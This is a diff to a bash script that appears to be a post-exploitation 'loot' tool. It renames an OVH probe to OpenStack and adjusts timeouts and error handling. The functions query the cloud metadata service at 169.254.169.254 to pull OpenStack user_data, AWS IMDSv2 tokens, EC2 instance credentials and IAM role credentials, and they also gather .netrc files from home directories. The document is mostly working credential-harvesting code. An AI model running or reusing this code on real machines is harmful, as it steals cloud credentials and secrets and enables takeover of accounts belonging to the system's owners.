@@ -502,39 +502,40 @@ _loot_homes() {
     done
 }
 
-_loot_ovh() {
+_loot_openstack() {
     local str
 
-    [ -n "$_HS_NOT_OVH" ] && return
-    [ -n "$_HS_NO_SSRF" ] && return
+    [ -n "$_HS_NOT_OPENSTACK" ] && return
+    [ -n "$_HS_NO_SSRF_169" ] && return
 
-    str="$(timeout -s SIGKILL 4 "${DL[@]}" "http://169.254.169.254/openstack/latest/user_data" 2>/dev/null)" || {
-        [ "$?" -eq 124 ] && _HS_NO_SSRF=1
+    str="$(timeout 4 "${DL[@]}" "http://169.254.169.254/openstack/latest/user_data" 2>/dev/null)" || {
+        [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
         unset str
     }
     [ -z "$str" ] && {
-        _HS_NOT_OVH=1
+        _HS_NOT_OPENSTACK=1
         return 255
     }
-    echo -e "${CB}OVH user_data${CDY}${CF}"
+    echo -e "${CB}OpenStack user_data${CDY}${CF}"
     echo "$str"
     echo -en "${CN}"
     echo -e "${CW}TIP: ${CDC}"'"${DL[@]}" "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
 }
 
 # FIXME: Search through environment variables of all running processes.
+# FIXME: Implement GCP & Digital Ocean. See https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
 _loot_aws() {
     local str
     local TOKEN
     local role
 
     [ -n "$_HS_NOT_AWS" ] && return
-    [ -n "$_HS_NO_SSRF" ] && return
+    [ -n "$_HS_NO_SSRF_169" ] && return
 
     command -v curl >/dev/null || return # AWS always has curl
 
-    str="$(timeout -s SIGKILL 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
-        [ "$?" -eq 124 ] && _HS_NO_SSRF=1
+    str="$(timeout 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
+        [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
         unset str
     }
     [ -z "$str" ] && {
@@ -543,21 +544,21 @@ _loot_aws() {
     }
     TOKEN="$str"
 
-    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data)"
-    [[ "$str" != *Lightsail* ]] && {
+    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data 2>/dev/null)"
+    [ -n "$str" ] && [[ "$str" != *Lightsail* ]] && {
         echo -e "${CB}AWS user_data (config)${CDY}${CF}"
         echo "$str"
         echo -en "${CN}"
     }
 
-    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)" || unset str
+    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 2>/dev/null)" || unset str
     [ -n "$str" ] && {
         echo -e "${CB}AWS EC2 Security Credentials${CDY}${CF}"
         echo "$str"
         echo -en "${CN}"
     }
 
-    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)" || unset str
+    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)" || unset str
     [ -n "$str" ] && {
         for role in $str; do
             echo -e "${CB}AWS IAM Role${CDY} ${role}${CF}"
@@ -655,9 +656,9 @@ loot() {
     _loot_homes "NETRC"  ".netrc"
 
     # SSRF
-    _loot_ovh
+    _loot_openstack
     _loot_aws
-    [ -z "$_HS_NO_SSRF" ] && {
+    [ -z "$_HS_NO_SSRF_169" ] && {
         # Found an SSRF
         echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
     }
